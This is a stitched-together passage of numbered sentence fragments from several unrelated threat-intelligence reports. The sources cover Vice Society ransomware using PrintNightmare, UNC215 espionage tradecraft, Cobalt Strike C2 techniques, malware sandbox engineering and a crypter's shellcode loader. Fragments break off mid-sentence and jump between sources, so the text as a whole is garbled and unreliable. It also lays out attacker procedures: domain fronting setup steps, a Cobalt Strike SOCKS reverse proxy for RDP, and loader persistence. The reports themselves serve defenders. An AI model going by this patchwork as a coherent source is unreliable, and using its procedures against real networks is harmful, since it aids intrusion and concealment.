Brumaghin, Joe Marshall, and Arnaud Zobec.","1":"Executive SummaryAnother threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 \/ CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack, according to Cisco Talos Incident Response research.","2":"While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society.","3":"Talos Incident Response's research demonstrates that multiple, distinct threat actors view this vulnerability as attractive to use during their attacks and may indicate that this vulnerability will continue to see more widespread adoption and incorporation by various adversaries moving forward.","4":"For defenders, it is important to understand the attack lifecycle leading up to the deployment of ransomware.","5":"If users have not already, they should download the latest patch for PrintNightmare from Microsoft.","6":"In this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice Society that leveraged this vulnerability.","7":"Many of these same TTPs are commonly observed in other ransomware attacks, such as a previously published analysis of a WastedLocker attack.","8":"Who is Vice Society?Vice Society is a relatively new player in the ransomware space.","9":"They emerged in mid-2021 and have been observed launching big-game hunting and double-extortion attacks, primarily targeting small or midsize victims.","10":"This group also has notably targeted public school districts and other educational institutions.","11":"As they are a new actor in this space, Vice Society's TTPs are difficult to quantify.","12":"However, based on incident response observations, they are quick to leverage new vulnerabilities for lateral movement and persistence on a victim's network.","13":"They also attempt to be innovative on end-point detection response bypasses.","14":"As with other threat actors operating in the big-game hunting space, Vice Society operates a data leak site, which they use to publish data exfiltrated from victims who do not choose to pay their extortion demands.","15":"Below is an example screenshot of this site.","16":"Recent attack methodologyThroughout the course of our analysis of a recent human-operated ransomware attack associated with Vice Society, we observed several notable tactics, techniques, and procedures (TTPs) used throughout each stage of the attack lifecycle.","17":"Some of the most interesting characteristics of this attack were:The use of utilities such as proxychains and impacket during the post-compromise phases of the attack lifecycle.","18":"The targeting of backups to prevent recovery following ransomware deployment.","19":"The degradation of ESXi servers used for virtualization in victim environments.","20":"The use of a DLL that takes advantage of the recently discovered PrintNightmare vulnerability for which Microsoft has previously released a security update.","21":"Attempts to bypass native Windows protections for credential theft and privilege escalation.","22":"Below are some key examples of the TTPs used in this attack as they relate to the Mitre ATT&CK Framework.","23":"DiscoveryATT&CK Technique: System

leveraged to conduct post-compromise discovery and reconnaissance within the environment.","24":"We observed attempts to access the backup solution employed in the environment, likely to prevent the organization from successfully recovering without paying the demanded ransom.","25":"The \"sudo\" command was used to obtain credentials associated with a commercial backup solution, likely trying to gain access to backups present within the environment.sudo -s","26":"-k -p","27":"[Backup Prompt] whoamiWe also observed the use of impacket, a common network protocol manipulation tool to enumerate the environment and obtain additional information about the Active Directory configuration in place.","28":"This is typically done to identify high-value targets that may be attractive, as attacks attempt to maximize their sphere of influence over as much of the environment as possible prior, eventually deploying ransomware and making their presence known.","29":"Below are some examples of the

operational within the target environment, attackers will typically perform reconnaissance, identifying additional target systems, and then move laterally from system to system as they attempt to escalate privileges and then, ultimately, deploy ransomware on many systems in the environment.","69":"During the investigation, we observed the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.","70":"This was typically performed via the following command-line syntax:C:\\Windows\\system32\\mstsc.exe \/v","71":"[HOSTNAME]The attacker also

objectives.","118":"In some instances, there is significant overlap and similarities between the approaches taken by distinct threat actors.","119":"They often leverage dual-use tools for various purposes to minimize their footprint and evade detection.","120":"Likewise, adversaries are constantly refining their approach to the ransomware attack lifecycle as they strive to operate more effectively, efficiently, and evasively.","121":"The use of the vulnerability known as PrintNightmare shows that adversaries are paying close attention and will quickly incorporate new tools that they find useful for various purposes during their attacks.","122":"Multiple distinct threat actors are now taking advantage of PrintNightmare, and this adoption will likely continue to increase as long as it is effective.","123":"It is important that defenders be aware of the various TTPs being used throughout the attack lifecycle so that they are prepared to prevent, detect, and respond to nefarious activity that may be indicative of a successful compromise of their environment.","124":"Failure to do so could result in widespread operational disruption, reputational damage, and the loss of

","147":"In addition to data from Mandiant Incident Response and FireEye telemetry, we worked with Israeli defense agencies to review data from additional compromises of Israeli entities.","148":"This analysis showed multiple, concurrent operations against Israeli government institutions, IT providers and telecommunications entities beginning in January 2019.","149":"During this time, UNC215 used new TTPs to hinder attribution and detection, maintain operational security, employ false flags, and leverage trusted relationships for lateral movement.","150":"We believe this adversary is still active in the region. ","151":"Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia. ","152":"After gaining initial access, the operators conduct credential harvesting and extensive internal network reconnaissance.","153":"This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.","154":"The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems. ","155":"In another incident response investigation, UNC215 pivoted to multiple OWA servers and installed web shells.","156":"In the following days, the operators interacted with these web shells from internal IP addresses, attempting to harvest credentials. ","157":"After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.","158":"UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.","159":"While UNC215 heavily relies on the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tools are developed and used exclusively by UNC215. Figure 1: Attack Lifecycle Tradecraft and Operational Security We identified numerous examples of efforts by UNC215 to foil network defenders by minimizing forensic evidence left on compromised hosts, exploiting relationships with trusted third parties, continuously improving the FOCUSFJORD backdoor, concealing command and control (C2) infrastructure, and incorporating false flags. ","160":"Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.","161":"This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise. ","162":"The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.","163":"The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.","164":"On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the system\u2019s registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.","165":"This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.","166":"A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.","167":"The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence. ","168":"Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.","169":"As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target. ","170":"Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.","171":"The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.","172":"We do not have enough context about the following samples to attribute all of them to UNC215, though they are representative of activity we have seen from the group.

","187":"FOCUSFJORD samples can be configured with up to 13 unique registry values which allow operators to control and organize compromised hosts.","188":"In addition to specifying details related to the loading and persistence mechanisms and C2 communications, there are two keys which allow the operator to add additional context about the victim: Registry key 12 is the \u201cgroup\u201d name.","189":"When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to \u201cdefault\u201d and is later manually changed by the actor, usually to the victim\u2019s domain name or organization name.","190":"Registry key 13 could be interpreted as the \u201cconsole\u201d name, although we do not fully understand how the identifier is used by the operators.","191":"We have observed the values \u201cgalway\u201d, \u201ciceland\u201d, \u201chelen\u201d, and \u201cidapro\u201d. ","192":"It is not clear how or if UNC215 uses these configuration parameters to organize and track large numbers of compromised hosts.","193":"We observed different console values within the same network, identical console values using different C2 addresses, and identical console values targeting different countries.","194":"Some FOCUSFJORD samples from 2018 and 2020 use the same console values despite the significant gap in time (See Table 1).

","406":"Domain Fronting Domain fronting is another method for concealing communication between the endpoint and the command and control servers.","407":"The main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.","408":"It essentially masks your traffic to a certain website by masquerading it as a different domain. ","409":"This technique is possible thanks to Content Delivery Networks (CDNs).","410":"Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).","411":"In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.","412":"Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strike page that discusses this technique. ","413":"Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.","414":"The following prerequisites must be met in order for domain fronting to be possible: Own a domain.","415":"(e.g., infosecppl.store) Pick one of the many web services that provide CDN capabilities.","416":"(e.g., cloudfront.net). ","417":"Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.","418":"(e.g., l33th4x0r.cloudfront.net). ","419":"Setup a profile to facilitate domain fronting. ","420":"Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource. ","421":"Step five is where things get interesting.","422":"Attackers can use legitimate domains that are registered under the same CDN provider.","423":"As demonstrated in the screenshot above, all they have to do is include their CDN endpoint domain (created in step three) in the host header of the request.","424":"In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header. ","425":"In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs: ","426":"This research paper released by academics from the University of California, Berkeley, is a great introduction to domain fronting.","427":"This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.","428":"One of those researchers is Vincent who wrote a great article on domain fronting.","429":"He explains in simple terms how it works.","430":"He also published a Python script to identify possible domains that can be leveraged for domain fronting. ","431":"Looking into our reporting, we don\u2019t see many instances of domain fronting.","432":"This is most likely due to the complex process of setting up the necessary infrastructure.","433":"Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.","434":"According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin. ","435":"The data above is available via our services.","436":"More information on this service and others can be found here. ","437":"Reverse Proxy using Cobalt Strike Beacon A technique that we come across often is a reverse proxy.","438":"We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.","439":"Cobalt Strike has the ability to run a SOCKS proxy server on the team server.","440":"This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.","441":"The screenshot below demonstrates this implementation. ","442":"Image credit: cobaltstrike.com Some of the cases we have observed threat actors using reverse proxy are: Diavol Ransomware BazarLoader and the Conti Leaks Snatch Ransomware ","443":"In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.","444":"There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted. ","445":"Below, we demonstrate how attackers take advantage of this technique using proxychains from the attackers\u2019 kali Linux host.","446":"In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server. ","447":"Creating the listening port (TCP port 8888) ","448":"In this second image, we employ proxychains from the attacker\u2019s Kali Linux host to RDP into our target\u2019s environment via the SOCKS server.","449":"We essentially add the team server\u2019s IP address into the proxychains configuration and connect with xfreerdp. ","450":"RDP into the target host using reverse proxy Looking into the generated artifacts, we can see that a 4624 type 3 event is created on the target host.","451":"One interesting aspect that we have also mentioned in similar cases from our reporting is that the victim\u2019s hostname is captured in this logon event as well as the source address being 127.0.0.1. Security Event ID 4624 Type 3 shows the attacker\u2019s hostname Once again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy. ","452":"Inside Cobalt Strike\u2019s","453":"C2 Traffic This section will attempt to illustrate how the different malleable C2 profiles can affect network communication. ","454":"In some of the examples below, we simulated the malicious C2 channel to show how different malleable profile configurations can change the observed traffic.","455":"After that, we\u2019ll examine network data associated with lateral movement and the various methods employed by Cobalt Strike operators based on our observations. ","456":"HTTP\/HTTPS C2 traffic ","457":"We will use a slightly modified version of the jquery profile to illustrate how the configuration defines the various fields that make up the C2 connection.","458":"Our previous article presented this jquery profile as one of the most commonly used profiles by threat actors in the intrusions we reported. ","459":"As shown above, malleable C2 profiles can generate unique network traffic based on the provided configuration.","460":"A portion of the malleable C2 profile configuration is shown at the bottom half of the screenshot.","461":"At the top half of the screenshot, we show the HTTP communication between the Beacon and the Cobalt Strike server. ","462":"The malleable profile determines the content of all parameters used in GET and POST requests.","463":"Because of how simple it is to change these parameters, creating network signatures for proactive defense can be difficult.","464":"Defenders can create signatures for publicly available profiles (see Sigma section below) or profiles extracted and made available thru open-source reporting.","465":"One could search for traffic that matches known patterns (such as jquery or amazon) but the target IP\/domain does not match the expected infrastructure. ","466":"DNS C2 traffic Cobalt Strike is capable of using DNS as the C2 method.","467":"Operators can choose to configure their server to respond to beacon requests in A, AAAA or TXT records.","468":"This strategy is useful for more covert operations, as the destination host could be a benign DNS server.","469":"Defenders will have to inspect the traffic data and look for suspicious DNS records. ","470":"The screenshot below is from the official Cobalt Strike documentation page and shows how DNS communication works between the compromised host and the C2 server. ","471":"In the below example, we emulated this technique and configured the Beacon to communicate over DNS and request new tasks using A records.","472":"In the same way, we can configure the Beacon to use TXT or AAAA records for requesting tasks or sending information to the server.","473":"It is worth noting that the default method is the DNS TXT record data channel.","474":"Below is the infrastructure that we used for demonstration purposes: Target Host: 192.168.88.179 Internal DNS server: 192.168.88.2 Cobalt Strike C2 domain: infosecppl.store We instructed the Beacon to execute the command systeminfo on the compromised host.","475":"As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.","476":"The activity took 5 seconds to complete. ","477":"As with HTTP\/HTTPS traffic, DNS traffic can be randomized using malleable C2 profiles.","478":"Some of the options that are available to threat actors are as follows: ","479":"The above table was taken from Cobalt Strike\u2019s official documentation SMB Beacons Another option for threat actors is to employ SMB beacons, once they have gained access to the network.","480":"SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.","481":"The communication between the two beacons is possible thanks to named pipes. ","482":"The operators can configure the pipename on the client; however, the default pipename starts with \u201cmsagent_#\u201d for SMB beacons.","483":"For a list of default pipe names for other services including some custom profiles check out @svch0st\u2019s post here. ","484":"SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.","485":"Additionally, due to SMB protocol being accessible in most internal networks, it makes for a reliable C2 method.","486":"Operators can also chain beacons and move laterally inside the network. ","487":"According to our records, SMB beacons are not frequently used.","488":"However, they\u2019re still a powerful weapon in the hands of skilled operators.","489":"As we do not see SMB beacons used often in our intrusion cases, we took an example case from our lab to demonstrate the effectiveness of this method. ","490":"We ran a PowerShell loader on the target host, which loaded a stageless SMB beacon in memory.","491":"In our case, the SMB Beacon is communicating over the network with a parent Beacon using named pipes.","492":"For this example, we chose the named pipe \u201cmy_pipes\u201d. ","493":"As you can see from the screenshots below, windows event 4688 contains the execution of the PowerShell command. ","494":"As explained in our previous Cobalt Strike article, Sysmon events 17 and 18 can log named pipes.","495":"However, Sysmon should be explicitly configured to log named pipes.","496":"A good public Sysmon config that includes named pipes and much more is Olaf\u2018s Sysmon Moduler. ","497":"Below, you can see the named pipe created that we specified on the Cobalt Strike interface when we created the SMB listener. ","498":"Furthermore, the SMB Beacon will communicate over port 445 to the main beacon as we described above, which will then send the results to the C2 server.","499":"This is known as chaining beacons.","500":"The below screenshot illustrates the SMB communication between the beacon on the beachhead host and the chained beacon(s).","501":"Another way to describe the communication is a parent\/child relationship. ","502":"The network traffic shows the target host communicating over SMB with the other compromised host running the parent HTTP Beacon.","503":"Named Pipes are used to facilitate the transition of data. ","504":"192.168.38.102 = SMB Beacon 192.168.38.104 = HTTP Parent Beacon Detecting and Analyzing C2 Traffic Thanks to free, open-source tooling, investigating network traffic has become more accessible.","505":"There are specific tools that we use to analyze suspicious network traffic in our intrusion cases.","506":"We believe that no single tool can provide complete detection coverage, but we can get close by combining them.","507":"In the following section, we will look at these tools that could accelerate analysis for defenders. ","508":"Sigma We\u2019ll go through a few Sigma rules that can help us detect Cobalt Strike\u2019s network activity. ","509":"Cobalt Strike DNS Beaconing is a rule created by Florian Roth which looks at DNS logs to detect the default DNS C2 behavior based on the dns_stager_subhost, put_output and dns_stager_subhost as seen above. ","510":"Below is a more generic rule created by @bareiss_patrick which is a good example of detecting suspicious DNS traffic based on a high amount of queries for a single domain. ","511":"Another more generic rule created by Daniil Yugoslavskiy uses dns logs to look for 50 or more TXT records from a single source in one minute: Default Cobalt Strike Certificate is a rule written by Bhabesh Raj that uses Zeek logs to detect the default Cobalt Strike certificate. ","512":"RDP over Reverse SSH Tunnel WFP by Samir Bousseaden is a rule that can look for suspicious RDP activity using reverse tunneling. ","513":"CobaltStrike Malleable Amazon Browsing Traffic Profile by Markus Neis which looks at proxy logs for the Amazon Malleable profile. ","514":"Other malleable profile rules include CobaltStrike Malformed UAs in Malleable Profiles, CobaltStrike Malleable (OCSP) Profile, and CobaltStrike Malleable OneDrive Browsing Traffic Profile. ","515":"All Sigma rules here are documented towards the bottom of Part 1. Rita Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures.","516":"Rita is a framework for detecting command and control communication.","517":"It takes Zeek logs data and can, in our experience, accurately detect beaconing activity. ","518":"One of the great features of Rita is its ease of use and detailed output information in various forms, including CSV and HTML.","519":"One simply can point Rita to the Zeek logs and wait for the results.","520":"The more available data, the more precise the results will be.","521":"Zeek logs can be generated from the PCAP(s). ","522":"The screenshot samples below show the results created by Rita based on the traffic we used in the previous sections to demonstrate the jquery malleable C2 profile. ","523":"We left the Beacon running for an hour to simulate an actual infection while several other network-unrelated processes ran in the background.","524":"During this hour, we tasked the Beacon with carrying out several commands.","525":"Rita determined that one hour of network data was adequate for identifying the beacon link and assigning it the highest score.","526":"Although, the more data you have, the more accurate the results will be. ","527":"Below, we can see the results from one of our recent cases, BazarLoader and the Conti Leaks.","528":"The first three IP addresses relate to the CS servers with which the Beacon communicated. ","529":"Rita accurately identified beaconing activity related to Cobalt Strike C2 communication.","530":"Using Rita, we can identify malicious C2 traffic based on multiple variables, including communication frequency, average bytes sent\/received, number of connections etc.","531":"As a result, we can detect Cobalt Strike beaconing regardless of the malleable C2 profile utilized or any additional jitter present. ","532":"JA3\/JA3S JA3 is an open-source project created by John Althouse, Jeff Atkinson and Josh Atkins.","533":"JA3\/JA3S can create SSL fingerprints for communication between clients and servers.","534":"The unique signatures can represent several values collected from fields in the Client","535":"Hello packet: - SSL Version - Accepted Ciphers - List of Extensions - Elliptic Curves - Elliptic Curve Formats For more information on how JA3 works, you can visit the official GitHub repository here: https:\/\/github.com\/salesforce\/ja3.

","583":"The first is an approach we call \u201cdependency emulation,\u201d where we can successfully detonate malware samples that would not normally be able to execute in our sandbox environment due to a lack of dependencies.","584":"We will also discuss our strategies of stealthy instrumentation for analysis of encrypted network traffic, to combat the ways SSL can be used to complicate command-and-control (C2) traffic analysis. ","585":"One overarching goal malware authors share is to remain undetected until their overall objective is reached.","586":"As we\u2019ve previously detailed in this blog post series, this has resulted in a seemingly limitless number of evasions and strategies targeted at confounding sandboxing and static analysis approaches.","587":"Due to the endless cat-and-mouse nature of reacting to malware authors\u2019 efforts to remain undetected, we\u2019ve come to understand that the most important characteristic for any automated malware analysis platform is adaptability.

","589":"Table of Contents Dependency EmulationExample File InfectorMitigating the Dependency ProblemVMI SSL\/TLS DecryptionTLS HandshakesExample SSL Decryption With WiresharkConclusionIndicators of Compromise Dependency Emulation In the context of malware execution, we talk a lot about dependencies.","590":"When we do, we\u2019re referring to additional code that an executable depends on that is not inside the executable file.","591":"On Windows, external dependencies are usually Dynamically Linked Libraries (DLLs) that contain additional functionality that can be imported into the process to execute. ","592":"Often malware does not require external libraries in order to execute its malicious code, or it might call functions from those external libraries in a very late stage of its execution.","593":"Over the past few years we\u2019ve noticed a large uptick in malicious Windows executables that require external libraries for things like graphical user interfaces or better cross-platform support, and if the libraries are missing, then the malicious sample won\u2019t be able to run.","594":"When Windows cannot load an application because of a missing library, it will show a \u201cSystem Error\u201d error message box that displays the missing library name. ","595":"When we run any executable in our sandbox environment that requires dependencies that are not present, we would see the same error.","596":"But we wouldn\u2019t be able to get any analysis information from the sample because no malicious code was executed. ","597":"In Figure 1, we can see a screenshot of the ATMSpitter malware family, which requires the DLL MSXFS.dll to fully detonate.","598":"Without the required DLL, we would just see an error dialog telling us that Windows can\u2019t run this file.","599":"If we place the correct file inside the same directory and run the sample again, it runs just fine","600":"and we can extract information such as executed system calls and modified memory regions. ","601":"Figure 1.","602":"ATMSpitter malware requires MSXFS.dll to run.","603":"File infectors like Sality, Floxif, Expiro and Ramnit typically infect predefined sets of executables that they find on the disk.","604":"If the infected file requires specific libraries that are not part of the operating system (OS), then chances are it\u2019s not going to detonate inside a malware analysis sandbox because these dependencies likely won\u2019t be preinstalled in the environment.","605":"Our sandbox environments are constrained in resources like disk space, and the number of DLL files in the world is seemingly infinite. ","606":"Normally, when we run into this situation and the OS loader refuses to execute our file, we are left with no data at all from dynamic analysis.","607":"What is even more frustrating about this situation is that in many cases, those dependencies don\u2019t matter for infected files in that they aren\u2019t even going to be used. ","608":"File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.","609":"The OS will refuse to load and execute our file, despite the fact that none of the dependencies mattered anyway. ","610":"Example File Infector Let\u2019s take a look at one file that has been infected by the Sality malware, which requires external dependencies to run inside a sandbox.","611":"The original file is Groove Audit Service from Microsoft Office, and it requires dependencies from the libraries GrooveNew.dll and GroveUtil.dll (shown in Figure 2).","612":"If those two libraries are missing on the system, then the sample won\u2019t be able to run. ","613":"Figure 2.","614":"The required dependencies.","615":"If we compare the original file to the infected file inside a PE viewer like StudPE (shown in Figure 3), we notice that the infector has modified only a few values in the PE headers including the size of the image, checksum and section flags to make the last section executable. ","616":"Figure 3.","617":"Sality infected executable compared to the original file.","618":"But if we open both the executables inside IDA Pro, we immediately see that the code at the entry point is totally different compared to the original (shown in Figures 4 and 5, below).","619":"The malicious code in the infected file is being called right at the entry point and doesn\u2019t require any dependencies to fully infect the system.","620":"However, because of the required dependencies, regular malware analysis sandboxes won\u2019t be able to run this kind of file. ","621":"Figure 4.","622":"Original entry point.","623":"Figure 5.","624":"Modified entry point.","625":"Mitigating the Dependency Problem What can we do about this dependency problem for analysis at scale?","626":"Dependency emulation is an approach we\u2019ve recently prototyped and found useful to address this. ","627":"The main idea of this approach is to detect this situation automatically, and to adapt our sandbox environment to the files being detonated to ensure executables will have a chance to detonate.","628":"Since we have full control over the sandbox, it\u2019s easy to determine that the executable under analysis requires an external library, and to lie to the executable that all of its dependency requirements are met. ","629":"Given the million or so unique Windows executables we process daily, it would be an extremely difficult (if not impossible) task to automatically detect and add the specific external libraries for each executable that required external dependencies.","630":"There are literally hundreds of millions of libraries out there with numerous versions for each, and it\u2019s not really feasible to support providing any arbitrary library in a way that guarantees the intended execution of every sample. ","631":"However, as we\u2019ve discussed in our initial post in this blog series, we often don't need full execution for accurate detection.","632":"If we can get the malware sample under analysis to get past the Windows loader, initialize itself and unpack any additional payloads, we have a much better shot at detection.","633":"Otherwise, we simply get an error from the Windows loader (as shown in Figure 1) and no additional information beyond what static analysis would buy us. ","634":"But what happens when the executable tries to call a function in one of those dependencies?","635":"The bad news is that, since we aren\u2019t trying to provide actual copies of the required libraries, we can\u2019t correctly simulate the function calls into any of the libraries not present in our environment. ","636":"The good news is that, in most cases, this is still enough for accurate detection.","637":"We don\u2019t need to correctly execute every code path present in the executable, we just need enough execution and memory artifacts for accurate detection.","638":"For this reason, in order to avoid unintentional crashes or bugs from the analyzed sample, our sandbox stops the execution if any function from the generated stub libraries is called. ","639":"All things considered, with this approach we've seen a lot of samples detonate that wouldn't otherwise, and we've seen many correct detections. ","640":"VMI SSL\/TLS Decryption Another challenge we\u2019ve faced with analyzing malware at scale is how to stealthily spy on TLS encrypted traffic in a way that\u2019s not detectable by the malware.","641":"As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it\u2019s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications. ","642":"It is possible, of course, to take the easy route and intercept and decrypt all of the traffic from our sandbox with a meddler-in-the-middle approach.","643":"The problem with this is that it\u2019s detectable by examining and validating TLS certificates.","644":"It\u2019s also possible to instrument and log calls to some of the higher level networking APIs, but again, this is also detectable in many cases and isn\u2019t going to get us all encrypted communications. ","645":"One solution we\u2019ve found useful for this problem is to detect when TLS connections are being initiated and log the symmetric keys generated for the SSL\/TLS connection using virtual machine introspection (VMI). ","646":"Before we look into that detection method, let\u2019s have a quick lesson on TLS handshakes. ","647":"TLS Handshakes When an SSL\/TLS connection is being established, certain data between the local system and the remote server is exchanged to validate each side's authenticity and generate symmetric keys to encrypt data over the wire. ","648":"This data includes the following: Preferred TLS version Supported cipher suites 32 bytes of random data used in the key generation algorithm A data signature, in the case of an ephemeral elliptic-curve Diffie-Hellman (ECDHE) key exchange An example of an ECDHE \u201cServer Hello\u201d message is shown in Figure 6. Figure 6.","649":"Wireshark screenshot illustrating the initial handshake for an SSL connection.","650":"In the case of a Diffie-Hellman (DH) handshake, additional DH parameters are then exchanged, and each side separately calculates a pre-master secret.","651":"Finally, the same master secret key is calculated on each side by utilizing the pre-master secret and the client and server random values. ","652":"The calculated master secret is 48 bytes in length.","653":"Through reverse engineering efforts, we discovered that this key generation occurs in the ncrypt.dll library in recent versions of the Windows OS. ","654":"The key generation happens in memory, so the key is never written to disk and it doesn\u2019t traverse the wire.","655":"By knowing the exact location in code where each master key is generated and precisely where it resides in memory, it is possible to extract the key.","656":"This can be accomplished with, for example, an analysis engine via virtual machine introspection, which makes a system invisible to the malware.","657":"A similar approach can be implemented in instances where other third party libraries are used for key generation, such as OpenSSL. ","658":"An example output, which includes everything needed to decrypt TLS traffic, is shown in Figure 7. ","659":"Figure 7.","660":"Extracted random value and master key.","661":"Final keys and initialization vectors used to encrypt and decrypt network traffic are generated from the master secret through a key expansion.","662":"Conveniently, the open source tool Wireshark\/Tshark accepts a keyfile to perform this decryption automatically on collected pcap traffic. ","663":"Example SSL Decryption With Wireshark Let's take a look at a real world example of a sample that belongs to the malware family FormBook.","664":"The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS. ","665":"If we open the recorded package capture in Wireshark and provide the extracted SSL\/TLS keys that were extracted by the analysis platform, we should be able to see the SSL encrypted traffic to the public file storage service, including the downloaded data. ","666":"The random client value and the master secret key must be stored in a specific file format that Wireshark supports.","667":"It looks like this: CLIENT_RANDOM","668":"<random_client_value> <master_secret_key> To provide the decryption keys to Wireshark, we have to use the option ssl.keylog_file, which we can pass through the command line.","669":"For example: Wireshark -r guest_traffic.pcap -o \"ssl.keylog_file:key_capture.keys\" After opening the capture (pcap) in Wireshark, the TLS encrypted data will be decrypted, and we can use the http filter to get the decrypted HTTPS traffic.","670":"This is shown in Figure 8. Figure 8.","671":"Decrypted HTTPS traffic.","672":"In Figures 9 and 10, we can see the communication to the public file storage service. ","673":"Figure 9.","674":"Communication to the public file storage service.","675":"Figure 10.","676":"Downloaded data from public file storage.","677":"With the decrypted content, we can write more precise behaviors and signatures that match a malicious sample's network communication. ","678":"Conclusion In this post we have discussed two important ways we\u2019ve been able to tailor our analysis environment.","679":"As we\u2019ve mentioned in previous posts, adaptability in sandboxing is exceptionally important when it comes to staying on top of the malware detection problem.","680":"Threats are continually evolving, and architecting analysis systems as more of a flexible, nicely abstracted software development kit instead of a stand-alone monolithic application is crucial.

","741":"Figure 11: The shellcode bytes inside the XML file The executable .text section\u2019s characteristics are configured to RWE (Read-Write-Execute) -- that way the actor doesn't need to use VirtualAlloc or VirtualProtect in order to copy the shellcode and transfer the execution.","742":"This helps with evasion since those functions are highly monitored by security solutions.","743":"Once the shellcode is copied to the executable, the DLL calls to the shellcode\u2019s entry point (shellcode_address). ","744":"Persistency Implementation If the crypter is configured to install persistence, the loader DLL will execute a new thread that loads another DLL (from the compressed files) that will handle this task. Figure 12: New thread creation for calling the persistent mechanism The newly loaded DLL will either use one of the following logics or both of them to implement the persistency: Write a.lnk file in the startup folder that executes the Crypter\u2019s main executable. ","745":"Figure 13: .lnk file persistence implementation Write a registry Run key that executes the Crypter\u2019s main executable. ","746":"Figure 14: registry run key persistence implementation The Decryption Shellcode The XML file (or any other file type used by the crypter) contains the following components: The first shellcode (referred to in this section). ","747":"An encrypted additional shellcode (referred to in the next section, the Loader shellcode) An encrypted payload. ","748":"The Decryption shellcode has three main tasks: first, it extracts the Loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted Loader shellcode. ","749":"Figure 15: Decryption shellcode execution flow The Decryption shellcode begins with dynamically locating the configuration structure by searching for a sequence of six or more identical bytes.","750":"This configuration holds pointers to the loader shellcode and the final payload; these are encrypted and split inside the XML. Figure 16: Configuration and XML file\u2019s structures Based on this, we can identify the configuration inside the XML file: Figure 17: Configuration structure Using this configuration the malware iterates over each chunk copies it, and decrypts it using the denoted decryption key (the configuration changes between samples). ","751":"Then, the shellcode searches for two DWORD placeholders, 0xBABADEDA and 0xDEADBEAF.","752":"It replaces the first placeholder with the address of the decrypted payload and the latter with the size of the payload.","753":"This data is used in the next stage, the Loader shellcode. ","754":"The Loader Shellcode The purpose of the Loader shellcode is to inject the decrypted payload within the currently running process (itself). ","755":"We can divide the loading mechanism into three stages: initialization, injection, and correction. ","756":"Initialization This stage is responsible for setting the relevant data that will be used during the injection and correction stages. ","757":"Figure 18: Extracting the data for injection and correction stages To start initializing, the Loader first saves the decrypted payload address and payload size according to the placeholder\u2019s addresses.","758":"Next, it parses the PE headers of the payload to extract the image size and the entry point according to the current executable\u2019s base 